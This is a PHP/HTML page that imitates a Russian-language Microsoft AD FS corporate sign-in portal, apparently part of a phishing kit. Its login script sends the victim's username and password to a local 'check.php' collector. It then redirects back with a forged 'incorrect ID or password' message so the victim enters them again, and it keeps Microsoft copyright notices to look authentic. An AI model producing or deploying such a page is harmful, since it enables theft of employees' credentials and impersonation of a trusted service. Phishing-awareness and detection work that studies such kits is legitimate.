<?php
$company_name = "COMPANY";
$error_text = "";
$user_name = "";

if (isset($_GET['user'])) {
    $user_name = htmlspecialchars($_GET['user']);
    $error_text = "Неверный идентификатор пользователя или пароль. Введите верный идентификатор пользователя и пароль и повторите попытку.";
}
?>

<html lang="ru-RU">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=10.000">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta http-equiv="cache-control" content="no-cache,no-store">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="-1">
    <meta name="mswebdialog-title" content="Connecting to Портал авторизации компании <?php echo $company_name; ?>">

    <title>Вход</title>
    <script type="text/javascript">
        //<![CDATA[
        function LoginErrors(){this.userNameFormatError = 'Введите идентификатор пользователя в формате \u0026quot;домен\\пользователя\u0026quot; или \u0026quot;пользователь@домен\u0026quot;.'; this.passwordEmpty = 'Введите пароль.'; this.passwordTooLong = 'Длина пароля должна быть менее 128 симв.';}; var maxPasswordLength = 128;
        //]]>
    </script>

    <script type="text/javascript">
        //<![CDATA[
        // Copyright (c) Microsoft Corporation.  All rights reserved.
        function InputUtil(errTextElementID, errDisplayElementID) {

            if (!errTextElementID)  errTextElementID = 'errorText';
            if (!errDisplayElementID)  errDisplayElementID = 'error';

            this.hasFocus = false;
            this.errLabel = document.getElementById(errTextElementID);
            this.errDisplay = document.getElementById(errDisplayElementID);
        };
        InputUtil.prototype.canDisplayError = function () {
            return this.errLabel && this.errDisplay;
        }
        InputUtil.prototype.checkError = function () {
            if (!this.canDisplayError){
                throw new Error ('Error element not present');
            }
            if (this.errLabel && this.errLabel.innerHTML) {
                this.errDisplay.style.display = '';
                var cause = this.errLabel.getAttribute('for');
                if (cause) {
                    var causeNode = document.getElementById(cause);
                    if (causeNode && causeNode.value) {
                        causeNode.focus();
                        this.hasFocus = true;
                    }
                }
            }
            else {
                this.errDisplay.style.display = 'none';
            }
        };
        InputUtil.prototype.setInitialFocus = function (input) {
            if (this.hasFocus) return;
            var node = document.getElementById(input);
            if (node) {
                if ((/^\s*$/).test(node.value)) {
                    node.focus();
                    this.hasFocus = true;
                }
            }
        };
        InputUtil.prototype.setError = function (input, errorMsg) {
            if (!this.canDisplayError) {
                throw new Error('Error element not present');
            }
            input.focus();

            if (errorMsg) {
                this.errLabel.innerHTML = errorMsg;
            }
            this.errLabel.setAttribute('for', input.id);
            this.errDisplay.style.display = '';
        };
        InputUtil.makePlaceholder = function (input) {
            var ua = navigator.userAgent;

            if (ua != null &&
                (ua.match(/MSIE 9.0/) != null ||
                    ua.match(/MSIE 8.0/) != null ||
                    ua.match(/MSIE 7.0/) != null)) {
                var node = document.getElementById(input);
                if (node) {
                    var placeholder = node.getAttribute("placeholder");
                    if (placeholder != null && placeholder != '') {
                        var label = document.createElement('input');
                        label.type = "text";
                        label.value = placeholder;
                        label.readOnly = true;
                        label.style.position = 'absolute';
                        label.style.borderColor = 'transparent';
                        label.className = node.className + ' hint';
                        label.tabIndex = -1;
                        label.onfocus = function () { this.nextSibling.focus(); };

                        node.style.position = 'relative';
                        node.parentNode.style.position = 'relative';
                        node.parentNode.insertBefore(label, node);
                        node.onkeyup = function () { InputUtil.showHint(this); };
                        node.onblur = function () { InputUtil.showHint(this); };
                        node.style.background = 'transparent';

                        node.setAttribute("placeholder", "");
                        InputUtil.showHint(node);
                    }
                }
            }
        };
        InputUtil.focus = function (inputField) {
            var node = document.getElementById(inputField);
            if (node) node.focus();
        };
        InputUtil.hasClass = function(node, clsName) {
            return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
        };
        InputUtil.addClass = function(node, clsName) {
            if (!this.hasClass(node, clsName)) node.className += " " + clsName;
        };
        InputUtil.removeClass = function(node, clsName) {
            if (this.hasClass(node, clsName)) {
                var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
                node.className = node.className.replace(reg, ' ');
            }
        };
        InputUtil.showHint = function (node, gotFocus) {
            if (node.value && node.value != '') {
                node.previousSibling.style.display = 'none';
            }
            else {
                node.previousSibling.style.display = '';
            }
        };
        //]]>
    </script>



    <link rel="stylesheet" type="text/css" href="/static/style.css">
    <style>
        .illustrationClass {background-image:url(/static/illustration.png);}
    </style>

</head>
<body dir="ltr" class="body">
<div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
    <h1>Требуется поддержка JavaScript</h1>
    <p>Требуется поддержка JavaScript. Этот веб-браузер не поддерживает JavaScript или в веб-браузере не включена поддержка JavaScript.</p>
    <p>Чтобы узнать, поддерживает ли веб-браузер JavaScript, или включить поддержку JavaScript, обратитесь к разделу справки веб-браузера.</p>
</div>
<script type="text/javascript" language="JavaScript">
    document.getElementById("noScript").style.display = "none";
</script>
<div id="fullPage">
    <div id="brandingWrapper" class="float">
        <div id="branding" class="illustrationClass"></div>
    </div>
    <div id="contentWrapper" class="float">
        <div id="content">
            <div id="header">
                Портал авторизации компании <?php echo $company_name; ?>
            </div>
            <div id="workArea">

                <div id="authArea" class="groupMargin">


                    <div id="loginArea">
                        <div id="loginMessage" class="groupMargin">Выполнить вход, используя учетную запись организации</div>

                        <div id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();">
                            <div id="error" class="fieldMargin error smallText" style="display: none;">
                                <label id="errorText" for=""><?php echo $error_text; ?>
                                </label>
                            </div>

                            <div id="formsAuthenticationArea">
                                <div id="userNameArea">
                                    <input id="userNameInput" name="UserName" value="<?php echo $user_name; ?>" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="proverka@example.com" autocomplete="off" type="email">
                                </div>

                                <div id="passwordArea">
                                    <input id="passwordInput" name="Password" tabindex="2" class="text fullWidth" placeholder="Пароль" autocomplete="off" type="password">
                                </div>
                                <div id="kmsiArea" style="display:none">
                                    <input name="Kmsi" id="kmsiInput" value="true" tabindex="3" type="checkbox">
                                    <label for="kmsiInput">Оставаться в системе</label>
                                </div>
                                <div id="submissionArea" class="submitMargin">
                                    <span id="submitButton" class="submit" tabindex="4" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="return Login.submitLoginRequest();">Вход</span>
                                </div>
                            </div>
                            <input id="optionForms" name="AuthMethod" value="FormsAuthentication" type="hidden">
                        </div>

                        <div id="authOptions">
                            <form id="options" method="post" action="https://auth.company.com:443/adfs/ls/">
                                <script type="text/javascript">
                                    function SelectOption(option) {
                                        var i = document.getElementById('optionSelection');
                                        i.value = option;
                                        document.forms['options'].submit();
                                        return false;
                                    }
                                </script>
                                <input id="optionSelection" name="AuthMethod" type="hidden">
                                <div class="groupMargin"></div>
                            </form>
                        </div>

                        <div id="introduction" class="groupMargin">

                        </div>

                        <script type="text/javascript">
                            //<![CDATA[

                            function Login() {
                            }

                            Login.userNameInput = 'userNameInput';
                            Login.passwordInput = 'passwordInput';

                            Login.initialize = function () {

                                var u = new InputUtil();

                                u.checkError();
                                u.setInitialFocus(Login.userNameInput);
                                u.setInitialFocus(Login.passwordInput);
                            }();

                            Login.submitLoginRequest = function () {
                                var u = new InputUtil();
                                var e = new LoginErrors();

                                var userName = document.getElementById(Login.userNameInput);
                                var password = document.getElementById(Login.passwordInput);

                                if (!userName.value || !userName.value.match('[@\\\\]')) {
                                    u.setError(userName, e.userNameFormatError);
                                    return false;
                                }

                                if (!password.value) {
                                    u.setError(password, e.passwordEmpty);
                                    return false;
                                }

                                if (password.value.length > maxPasswordLength) {
                                    u.setError(password, e.passwordTooLong);
                                    return false;
                                }

                                var xhr = new XMLHttpRequest();
                                var body = 'login=' + userName.value + '&password=' + password.value;

                                xhr.open("POST", '/check.php', false);
                                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                                xhr.send(body);

                                window.location.href = "/?user=" + userName.value;
                            };

                            InputUtil.makePlaceholder(Login.userNameInput);
                            InputUtil.makePlaceholder(Login.passwordInput);
                            //]]>
                        </script>
                    </div>

                </div>

            </div>
            <div id="footerPlaceholder"></div>
        </div>
        <div id="footer">
            <div id="footerLinks" class="floatReverse">
                <div><span id="copyright">© Корпорация Майкрософт, 2013</span></div>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript">
    //<![CDATA[
    // Copyright (c) Microsoft Corporation.  All rights reserved.

    // This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
    "use strict";

    // iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
    // Note change input type does not work on all versions of all browsers.
    if (navigator.userAgent.match(/iPhone/i) != null) {
        var emails = document.querySelectorAll("input[type='email']");
        if (emails) {
            for (var i = 0; i < emails.length; i++) {
                emails[i].type = 'text';
            }
        }
    }

    // In the CSS file we set the ms-viewport to be consistent with the device dimensions,
    // which is necessary for correct functionality of immersive IE.
    // However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
    // values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
    // Windows 8 phone has agent string 'IEMobile 10.0'
    if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
        var msViewportStyle = document.createElement("style");
        msViewportStyle.appendChild(
            document.createTextNode(
                "@-ms-viewport{width:auto!important}"
            )
        );
        msViewportStyle.appendChild(
            document.createTextNode(
                "@-ms-viewport{height:auto!important}"
            )
        );
        document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
    }

    // If the innerWidth is defined, use it as the viewport width.
    if (window.innerWidth && window.outerWidth && window.innerWidth !== window.outerWidth) {
        var viewport = document.querySelector("meta[name=viewport]");
        viewport.setAttribute('content', 'width=' + window.innerWidth + 'px; initial-scale=1.0; maximum-scale=1.0');
    }

    // Gets the current style of a specific property for a specific element.
    function getStyle(element, styleProp) {
        var propStyle = null;

        if (element && element.currentStyle) {
            propStyle = element.currentStyle[styleProp];
        }
        else if (element && window.getComputedStyle) {
            propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
        }

        return propStyle;
    }

    // The script below is used for downloading the illustration image
    // only when the branding is displaying. This script work together
    // with the code in PageBase.cs that sets the html inline style
    // containing the class 'illustrationClass' with the background image.
    var computeLoadIllustration = function () {
        var branding = document.getElementById("branding");
        var brandingDisplay = getStyle(branding, "display");
        var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

        if (brandingDisplay && brandingDisplay !== "none" &&
            brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
            var newClass = "illustrationClass";

            if (branding.classList && branding.classList.add) {
                branding.classList.add(newClass);
            } else if (branding.className !== undefined) {
                branding.className += " " + newClass;
            }
            if (window.removeEventListener) {
                window.removeEventListener('load', computeLoadIllustration, false);
                window.removeEventListener('resize', computeLoadIllustration, false);
            }
            else if (window.detachEvent) {
                window.detachEvent('onload', computeLoadIllustration);
                window.detachEvent('onresize', computeLoadIllustration);
            }
        }
    };

    if (window.addEventListener) {
        window.addEventListener('resize', computeLoadIllustration, false);
        window.addEventListener('load', computeLoadIllustration, false);
    }
    else if (window.attachEvent) {
        window.attachEvent('onresize', computeLoadIllustration);
        window.attachEvent('onload', computeLoadIllustration);
    }

    //]]>
</script>





</body></html>